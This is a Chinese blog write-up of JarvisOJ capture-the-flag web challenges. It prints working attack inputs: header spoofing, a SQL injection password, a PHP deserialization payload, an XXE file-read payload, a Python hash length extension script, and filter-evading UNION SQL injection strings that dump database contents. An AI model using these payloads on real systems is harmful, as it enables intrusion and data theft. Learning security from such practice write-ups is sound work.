---
title: JarvisOJ - Web の Write-Up Part 1
date: 2020-03-11 22:12:00
categories:
- WriteUPs
- JarvisOJ
tags:
- Web
---
很久之前就有朋友给我推荐了这个CTF平台，玩了一段时间，基本把所有的WEB题目都做完了，写个WP记录一下过程。

<!-- more -->

## Port 51

打开界面之后提示我们通过51端口访问：

![](/img/JarvisOJ-WEB-1/WEB1.png)

根据提示通过curl指定本地端口即可获得flag：

![](/img/JarvisOJ-WEB-1/WEB2.png)

![](/img/JarvisOJ-WEB-1/WEB3.png)

## Localhost

打开后提示只能通过本地地址访问：

![](/img/JarvisOJ-WEB-1/WEB4.png)

通过抓包在文件头添加`X-Forwarded-For：127.0.0.1`标签，伪造localhost地址即可获得flag。

## Login

打开界面就是一个密码输入框：

![](/img/JarvisOJ-WEB-1/WEB5.png)

随便输入一个密码提示密码错误。试了很久注入，也没什么头绪，就抓包看一下：

![](/img/JarvisOJ-WEB-1/WEB6.png)

果然提示了一个hint，这是一个SQL注入，需要通过寻找合适的密码构造`SELECT * FROM admin WHERE username = 'admin' and password = '' or 'XXX`这样的语句。

这里提供一个：ffifdyop，输入后提交即可获得flag。

## 神盾局的秘密

打开后就是一张神盾局logo的图片，查看下源码有个很有趣的地方：

![](/img/JarvisOJ-WEB-1/WEB7.png)

点进去一看就是一张图片，但是是被解析成脚本的，再解码一下img后面的参数为shield.jpg。猜测img参数存在文件包含漏洞，将index.php通过base64加密得到aW5kZXgucGhw，提交后得到下面的源码：

![](/img/JarvisOJ-WEB-1/WEB8.png)

接下来base64加密shield.php，提交c2hpZWxkLnBocA==，得到下图：

![](/img/JarvisOJ-WEB-1/WEB9.png)

直接访问pctf.php,`http://web.jarvisoj.com:32768/showimg.php?img=cGN0Zi5waHA=`却提示文件不存在。

回头重新分析index.php源码，发现参数输入class，反序列化函数和过滤，改写shield.php源代码。

```php
<?php
	//flag is in pctf.php
	class Shield {
		public $file;
		function __construct($filename = '') {
			$this -> file = $filename;
		}
		function readfile() {
			if (!empty($this->file) && stripos($this->file,'..')===FALSE  
			&& stripos($this->file,'/')===FALSE && stripos($this->file,'\\')==FALSE) {
				return @file_get_contents($this->file);
			}
		}
	}
	$x = new Shield('pctf.php');
	echo serialize($x);
?>
```

本地运行，得到class参数的值。O:6:"Shield":1:{s:4:"file";s:8:"pctf.php";}

访问`http://web.jarvisoj.com:32768/index.php?class=O:6:"Shield":1:{s:4:"file";s:8:"pctf.php";}`查看源代码得到flag:

![](/img/JarvisOJ-WEB-1/WEB10.png)

## Admin

访问页面只有hello world，扫了下网站目录，发现有robots.txt，然后指向admin_s3cr3t.php。

![](/img/JarvisOJ-WEB-1/WEB11.png)

但是这是个错误的flag。再次失去线索，尝试burp抓包试一下:

![](/img/JarvisOJ-WEB-1/WEB12.png)

果然发现一个有趣的admin=0，结合题目，改包admin=1提交获取flag。

## API调用

打开后是一个提交框，查看源码有具体脚本：

![](/img/JarvisOJ-WEB-1/WEB13.png)

抓包发现提交的只是特定的值，默认格式是json：

![](/img/JarvisOJ-WEB-1/WEB14.png)

其实这里存在XXE漏洞，将Content-Type的值为application/xml,然后传入xml代码：

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [<!ENTITY file SYSTEM "file:///home/ctf/flag.txt">]>
<root>&file;</root>
```

即可得到flag。

## Flag在管理员手里

打开提示只有admin才能看见flag，burp抓包发现奇怪的cookie：

![](/img/JarvisOJ-WEB-1/WEB15.png)

其实之前在实验吧玩过同样的套路，这是hash长度扩展攻击。真正的解题在于存在源码泄露,在`http://web.jarvisoj.com:32778/index.php~`可以找到源码，然后知道这是hash长度扩展攻击。

不过这题比实验吧更大的难度在于不知道盐的长度，所以采用爆破的方法：

```Python
import hashpumpy
import urllib
import requests
for i in range(1,30):
	m=hashpumpy.hashpump('3a4727d57463f122833d9e732f94e4e0',';\"tseug\":5:s',';\"nimda\":5:s',i)
	print i		
	url='http://120.26.131.152:32778/'
	digest=m[0]
	
	message=urllib.quote(urllib.unquote(m[1])[::-1])
	cookie='role='+message+'; hsh='+digest
	#print cookie
	headers={
	'cookie': cookie,
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0',
	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
	'Accept-Language': ':zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
	'Accept-Encoding': 'gzip, deflate'
    }
	print headers
	re=requests.get(url=url,headers=headers)
	print re.text
	if "Welcome" in re.text:
		print re;
		break
```

运行程序然后构造最终的cookie：

`role=s%3A5%3A%22admin%22%3B%00%00%00%00%00%00%00%C0%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80s%3A5%3A%22guest%22%3B; hsh=fcdc3840332555511c4e4323f6decb07`

![](/img/JarvisOJ-WEB-1/WEB16.png)

## IN A Mess

打开之后查看源码发现一个index.phps提示，访问发现是网站源代码。

![](/img/JarvisOJ-WEB-1/WEB17.png)

出现3个参数：id，a，b。

id：id==0典型的PHP弱比较，利用id=0a或id=0e123或id=asd均可实现绕过。

b：strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4) 这里要求：b的长度大于5，且是基于eregi函数的弱类型，用%00的绕过（ strlen函数对%00不截断但substr截断）那么可以令b=%00411111。

此处链接一篇[博客](https://blog.csdn.net/qq_31481187/article/details/60968595)可供参考。

a：由data进行赋值：$data = @file_get_contents($a,'r') 而又有$data=="1112 is a nice lab!" 可以利用远程文件包含在allow_url_include开启时可以使用，但发现对$a有了.过滤所以还是data协议比较稳妥。

此处链接另一篇[博客](https://blog.csdn.net/lxgwm2008/article/details/38437875)可供参考，这里采用的格式是：data:

最后构造payload：id=0e&a=data:,1112 is a nice lab!&b=%00411111，得到：

![](/img/JarvisOJ-WEB-1/WEB18.png)

看起来像是一个网址，访问一下，页面上没什么东西，但是发现url自动跳转为`http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=1`，猜测id参数存在注入漏洞。

经过尝试，发现过滤了空格。改用`/**/`替代空格发现还是不行，发现`/***/`可以。同时还过滤了union,select，通过双写可绕过。

![](/img/JarvisOJ-WEB-1/WEB19.png)

![](/img/JarvisOJ-WEB-1/WEB20.png)

开始尝试：

id=1/*1*/order/*1*/by/*1*/1 显示正常

id=1/*1*/order/*1*/by/*1*/2 显示正常

id=1/*1*/order/*1*/by/*1*/4 显示错误，字段数为3

id=-1/*12*/uniunionon/*12*/seselectlect/*12*/1,2,(database())%23

得到数据库名test。

id=-1/*12*/uniunionon/*12*/seselectlect/*12*/1,2,(seselectlect/*12*/group_concat(table_name)/*12*/frfromom/*12*/information_schema.tables/*12*/where/*12*/table_schema=database())%23

得到表名：content。

id=-1/*12*/uniunionon/*12*/seselectlect/*12*/1,2,(selselectect/*12*/group_concat(column_name)/*12*/frofromm/*12*/information_schema.columns/*12*/where/*12*/table_name=0x636f6e74656e74)%23

得到列名：context。

id=-1/*12*/uniunionon/*12*/seselectlect/*12*/1,2,(selselectect/*12*/context/*12*/frofromm/*1*/content)%23

得到flag：PCTF{Fin4lly_U_got_i7_C0ngRatulation5}。

## 欲知后事如何，请听下回分解
